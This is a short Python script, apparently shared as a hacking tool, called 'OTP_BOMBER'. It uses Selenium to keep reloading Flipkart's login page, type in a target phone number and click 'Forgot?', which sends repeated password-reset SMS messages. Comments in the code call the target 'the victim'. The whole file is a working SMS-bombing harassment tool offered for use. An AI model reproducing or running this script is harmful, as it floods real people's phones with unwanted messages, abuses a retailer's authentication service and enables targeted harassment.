import pyfiglet 
  
result = pyfiglet.figlet_format("OTP_BOMBER")
result1 = pyfiglet.figlet_format("developed by SHAMS", font = "digital" ) 
 
print(result) 

print(result1)
from selenium import webdriver 
import time 

# create instance of Chrome webdriver 
browser = webdriver.Firefox() 

# set the frequency of sms 
frequency = 10

# target mobile number, change it to victim's number and 
# also ensure that it's registered on flipkart 
s=input("enter the mobile number in the format of indian code")
mobile_number =s

for i in range(frequency): 
	browser.get('https://www.flipkart.com/account/login?ret =/') 

	# find the element where we have to 
	# enter the number using the class name 
	number = browser.find_element_by_class_name('_2zrpKA') 

	# automatically type the target number 
	number.send_keys(s) 
	
	# find the element to send a forgot password 
	# request using it's class name 
	forgot = browser.find_element_by_link_text('Forgot?') 
	
	# clicking on that element 
	forgot.click() 
	
	# set the interval to send each sms 
	time.sleep(10) 
	
# Close the browser 
browser.quit() 
##developed by S4CRED_W4RRIOR/Shams

##developed by S4CRED_W4RRIOR/shams
